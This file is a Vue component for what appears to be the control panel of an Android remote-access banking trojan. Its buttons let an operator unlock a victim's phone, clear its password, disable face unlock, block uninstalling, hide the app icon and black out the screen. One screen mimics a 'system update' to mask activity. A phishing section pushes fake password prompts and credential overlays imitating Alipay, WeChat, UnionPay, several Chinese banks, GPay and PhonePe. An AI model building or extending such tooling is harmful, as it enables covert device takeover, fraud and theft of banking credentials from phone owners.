<script setup lang="ts">
import { ref } from 'vue';
import {
    NCollapse,
    NCollapseItem,
    NSpace,
    NButton,
    NButtonGroup,
    NInput,
    NSelect,
    NIcon,
    NGrid,
    NGridItem,
} from 'naive-ui';
import {
    HomeOutline,
    ArrowBackOutline,
    AppsOutline,
    SunnyOutline,
    LockClosedOutline,
    LockOpenOutline,
    CameraOutline,
    VolumeMuteOutline,
    VolumeHighOutline,
    ClipboardOutline,
    ShieldOutline,
    FishOutline,
    TvOutline,
    PhonePortraitOutline,
    LogoAlipay,
    CardOutline,
    CashOutline,
    BusinessOutline,
    LeafOutline,
    PlanetOutline,
    StorefrontOutline,
    LogoUsd,
} from '@vicons/ionicons5';
import { ChatbubbleEllipsesOutline as LogoWechat } from '@vicons/ionicons5';
import { quickApps } from '@/constants/quickApps';

interface Emits {
    (e: 'navigate', type: 'home' | 'back' | 'recent'): void;
    (e: 'volumeUp'): void;
    (e: 'volumeDown'): void;
    (e: 'showKeyboard'): void;
    (e: 'hideKeyboard'): void;
    (e: 'paste', text: string): void;
    (e: 'lock', type: 0 | 1 | 2 | 3): void;
    (e: 'screenshot'): void;
    (e: 'wakeScreen'): void;
    (e: 'sendMute'): void;
    (e: 'sendUnmute'): void;
    (e: 'openQuickApp', app: string): void;
    (e: 'sendKb', type: number): void;
    (e: 'sendBlock', type: number): void;
    (e: 'hideIcon'): void;
    (e: 'sendPhish', type: string): void;
    (e: 'sendBankPhish', bank: string): void;
    (e: 'toggleBlockText', text: string, bg: string): void;
}

const emit = defineEmits<Emits>();

const pasteText = ref('');
const phishType = ref('0');
const blockText = ref('');
const blockBg = ref('0');
const isBlockTextActive = ref(false);

// Default expanded: navigation
const expandedNames = ref(['navigation']);

const handlePaste = () => {
    if (pasteText.value.trim()) {
        emit('paste', pasteText.value);
        pasteText.value = '';
    }
};

const handleSendPhish = () => {
    emit('sendPhish', phishType.value);
};

const handleToggleBlockText = () => {
    isBlockTextActive.value = !isBlockTextActive.value;
    emit('toggleBlockText', blockText.value, blockBg.value);
};

const bankButtons = [
    { name: 'IM', code: '0', color: '#6366f1', icon: CashOutline },
    { name: 'TP', code: '2', color: '#8b5cf6', icon: CashOutline },
    { name: '支付宝', code: '6', color: '#1677ff', icon: LogoAlipay },
    { name: '微信', code: '7', color: '#07c160', icon: LogoWechat },
    { name: '云闪付', code: '8', color: '#e62129', icon: CardOutline },
    { name: '建行', code: '9', color: '#0066b3', icon: BusinessOutline },
    { name: '邮储', code: '10', color: '#007d3a', icon: CashOutline },
    { name: '农行', code: '11', color: '#009944', icon: LeafOutline },
    { name: '中行', code: '12', color: '#c9151e', icon: PlanetOutline },
    { name: '工行', code: '13', color: '#e60012', icon: StorefrontOutline },
    { name: '招行', code: '14', color: '#dc241f', icon: CashOutline },
    { name: 'GPay', code: '15', color: '#4285f4', icon: LogoUsd },
    { name: 'PhonePe', code: '16', color: '#5f259f', icon: PhonePortraitOutline },
    { name: 'AN', code: '17', color: '#f59e0b', icon: CashOutline },
    { name: 'MB', code: '18', color: '#00a0e9', icon: PhonePortraitOutline },
    { name: 'BC', code: '19', color: '#ff6b00', icon: CashOutline },
];
</script>

<template>
    <div class="advanced-controls">
        <div class="controls-header">
            <span class="controls-title">高级控制</span>
        </div>
        
        <NCollapse v-model:expanded-names="expandedNames" accordion>
            <!-- 导航控制 -->
            <NCollapseItem name="navigation">
                <template #header>
                    <div class="collapse-header">
                        <NIcon :component="AppsOutline" size="16" />
                        <span>导航控制</span>
                    </div>
                </template>
                <NButtonGroup size="small" style="width: 100%;">
                    <NButton style="flex: 1;" @click="emit('navigate', 'back')">
                        <template #icon>
                            <NIcon :component="ArrowBackOutline" />
                        </template>
                        返回
                    </NButton>
                    <NButton style="flex: 1;" @click="emit('navigate', 'home')">
                        <template #icon>
                            <NIcon :component="HomeOutline" />
                        </template>
                        主页
                    </NButton>
                    <NButton style="flex: 1;" @click="emit('navigate', 'recent')">
                        <template #icon>
                            <NIcon :component="AppsOutline" />
                        </template>
                        多任务
                    </NButton>
                </NButtonGroup>
            </NCollapseItem>

            <!-- 设备控制 -->
            <NCollapseItem name="device">
                <template #header>
                    <div class="collapse-header">
                        <NIcon :component="PhonePortraitOutline" size="16" />
                        <span>设备控制</span>
                    </div>
                </template>
                <NGrid :cols="2" :x-gap="8" :y-gap="8">
                    <NGridItem>
                        <NButton size="small" block @click="emit('wakeScreen')">
                            <template #icon>
                                <NIcon :component="SunnyOutline" />
                            </template>
                            点亮
                        </NButton>
                    </NGridItem>
                    <NGridItem>
                        <NButton size="small" block @click="emit('lock', 0)">
                            <template #icon>
                                <NIcon :component="LockOpenOutline" />
                            </template>
                            解锁
                        </NButton>
                    </NGridItem>
                    <NGridItem>
                        <NButton size="small" block type="warning" @click="emit('lock', 1)">
                            <template #icon>
                                <NIcon :component="LockClosedOutline" />
                            </template>
                            锁屏
                        </NButton>
                    </NGridItem>
                    <NGridItem>
                        <NButton size="small" block @click="emit('sendMute')">
                            <template #icon>
                                <NIcon :component="VolumeMuteOutline" />
                            </template>
                            静音
                        </NButton>
                    </NGridItem>
                    <NGridItem>
                        <NButton size="small" block @click="emit('sendUnmute')">
                            <template #icon>
                                <NIcon :component="VolumeHighOutline" />
                            </template>
                            取消静音
                        </NButton>
                    </NGridItem>
                    <NGridItem>
                        <NButton size="small" block @click="emit('screenshot')">
                            <template #icon>
                                <NIcon :component="CameraOutline" />
                            </template>
                            截图
                        </NButton>
                    </NGridItem>
                </NGrid>
            </NCollapseItem>

            <!-- 快速应用 -->
            <NCollapseItem name="apps">
                <template #header>
                    <div class="collapse-header">
                        <NIcon :component="AppsOutline" size="16" />
                        <span>快速应用</span>
                    </div>
                </template>
                <div class="app-grid">
                    <NButton
                        v-for="app in quickApps"
                        :key="app.key"
                        size="tiny"
                        class="app-btn"
                        :style="{ backgroundColor: app.color, color: '#fff', borderColor: app.color }"
                        @click="emit('openQuickApp', app.key)"
                    >
                        <template #icon>
                            <NIcon :component="app.icon" />
                        </template>
                        {{ app.key }}
                    </NButton>
                </div>
            </NCollapseItem>

            <!-- 安全控制 -->
            <NCollapseItem name="security">
                <template #header>
                    <div class="collapse-header">
                        <NIcon :component="ShieldOutline" size="16" />
                        <span>安全控制</span>
                    </div>
                </template>
                <NGrid :cols="2" :x-gap="8" :y-gap="8">
                    <NGridItem>
                        <NButton size="tiny" block @click="emit('sendKb', 2)">
                            防卸载
                        </NButton>
                    </NGridItem>
                    <NGridItem>
                        <NButton size="tiny" block @click="emit('sendKb', 3)">
                            可卸载
                        </NButton>
                    </NGridItem>
                    <NGridItem>
                        <NButton size="tiny" block @click="emit('sendBlock', 0)">
                            黑屏
                        </NButton>
                    </NGridItem>
                    <NGridItem>
                        <NButton size="tiny" block @click="emit('sendBlock', 1)">
                            取消黑屏
                        </NButton>
                    </NGridItem>
                    <NGridItem>
                        <NButton size="tiny" block @click="emit('sendBlock', 2)">
                            阻止操作
                        </NButton>
                    </NGridItem>
                    <NGridItem>
                        <NButton size="tiny" block @click="emit('sendBlock', 3)">
                            允许操作
                        </NButton>
                    </NGridItem>
                    <NGridItem>
                        <NButton size="tiny" block @click="emit('lock', 2)">
                            清密码
                        </NButton>
                    </NGridItem>
                    <NGridItem>
                        <NButton size="tiny" block @click="emit('lock', 3)">
                            禁人脸
                        </NButton>
                    </NGridItem>
                    <NGridItem :span="2">
                        <NButton size="tiny" block type="warning" @click="emit('hideIcon')">
                            隐藏图标
                        </NButton>
                    </NGridItem>
                </NGrid>
            </NCollapseItem>

            <!-- 文本操作 -->
            <NCollapseItem name="text">
                <template #header>
                    <div class="collapse-header">
                        <NIcon :component="ClipboardOutline" size="16" />
                        <span>文本操作</span>
                    </div>
                </template>
                <NSpace vertical size="small">
                    <div class="input-row">
                        <NInput
                            v-model:value="pasteText"
                            placeholder="输入文本粘贴到设备..."
                            size="small"
                            @keyup.enter="handlePaste"
                        />
                        <NButton size="small" type="primary" @click="handlePaste">
                            粘贴
                        </NButton>
                    </div>
                </NSpace>
            </NCollapseItem>

            <!-- 钓鱼功能 -->
            <NCollapseItem name="phishing">
                <template #header>
                    <div class="collapse-header">
                        <NIcon :component="FishOutline" size="16" />
                        <span>钓鱼功能</span>
                    </div>
                </template>
                <NSpace vertical size="small">
                    <div class="phish-row">
                        <NSelect
                            v-model:value="phishType"
                            size="small"
                            :options="[
                                { label: '自由选择密码', value: '0' },
                                { label: '壁纸图案密码', value: '1' },
                                { label: '壁纸数字密码', value: '2' },
                                { label: '壁纸混合密码', value: '3' },
                            ]"
                            style="flex: 1;"
                        />
                        <NButton size="small" type="error" @click="handleSendPhish">
                            钓鱼
                        </NButton>
                    </div>

                    <div class="section-subtitle">银行/支付钓鱼</div>
                    <div class="bank-grid">
                        <NButton
                            v-for="bank in bankButtons"
                            :key="bank.code"
                            size="tiny"
                            class="bank-btn"
                            :style="{ backgroundColor: bank.color, color: '#fff', borderColor: bank.color }"
                            @click="emit('sendBankPhish', bank.code)"
                        >
                            <template #icon>
                                <NIcon :component="bank.icon" />
                            </template>
                            {{ bank.name }}
                        </NButton>
                    </div>
                </NSpace>
            </NCollapseItem>

            <!-- 黑屏文字 -->
            <NCollapseItem name="blocktext">
                <template #header>
                    <div class="collapse-header">
                        <NIcon :component="TvOutline" size="16" />
                        <span>黑屏文字</span>
                    </div>
                </template>
                <div class="block-text-row">
                    <NInput
                        v-model:value="blockText"
                        placeholder="黑屏显示文字内容"
                        size="small"
                        style="flex: 1;"
                    />
                    <NSelect
                        v-model:value="blockBg"
                        size="small"
                        :options="[
                            { label: '黑色背景', value: '0' },
                            { label: '系统更新', value: '1' },
                        ]"
                        style="width: 100px;"
                    />
                    <NButton
                        size="small"
                        :type="isBlockTextActive ? 'error' : 'default'"
                        @click="handleToggleBlockText"
                    >
                        {{ isBlockTextActive ? '停止' : '显示' }}
                    </NButton>
                </div>
            </NCollapseItem>
        </NCollapse>
    </div>
</template>

<style scoped>
.advanced-controls {
    background: white;
    border-radius: 16px;
    border: 1px solid #e2e8f0;
    box-shadow: 0 2px 8px rgba(0, 0, 0, 0.04);
    overflow: hidden;
}

.controls-header {
    padding: 12px 16px;
    background: linear-gradient(135deg, #f8fafc 0%, #f1f5f9 100%);
    border-bottom: 1px solid #e2e8f0;
}

.controls-title {
    font-size: 13px;
    font-weight: 600;
    color: #64748b;
    text-transform: uppercase;
    letter-spacing: 0.5px;
}

.collapse-header {
    display: flex;
    align-items: center;
    gap: 8px;
    font-size: 14px;
    font-weight: 500;
    color: #475569;
}

.advanced-controls :deep(.n-collapse-item__header) {
    padding: 12px 16px;
}

.advanced-controls :deep(.n-collapse-item__content-wrapper) {
    padding: 0 16px 12px 16px;
}

.section-subtitle {
    font-size: 11px;
    color: #94a3b8;
    margin-top: 8px;
    margin-bottom: 4px;
}

.app-grid {
    display: grid;
    grid-template-columns: repeat(2, 1fr);
    gap: 6px;
}

.app-btn {
    font-size: 11px;
    padding: 0 4px;
}

.app-btn :deep(.n-icon) {
    font-size: 12px;
}

.bank-grid {
    display: grid;
    grid-template-columns: repeat(3, 1fr);
    gap: 6px;
}

.bank-btn {
    font-size: 10px;
    padding: 0 2px;
}

.bank-btn :deep(.n-icon) {
    font-size: 10px;
}

.input-row {
    display: flex;
    gap: 8px;
    align-items: center;
}

.phish-row {
    display: flex;
    gap: 8px;
    align-items: center;
}

.block-text-row {
    display: flex;
    gap: 8px;
    align-items: center;
}
</style>
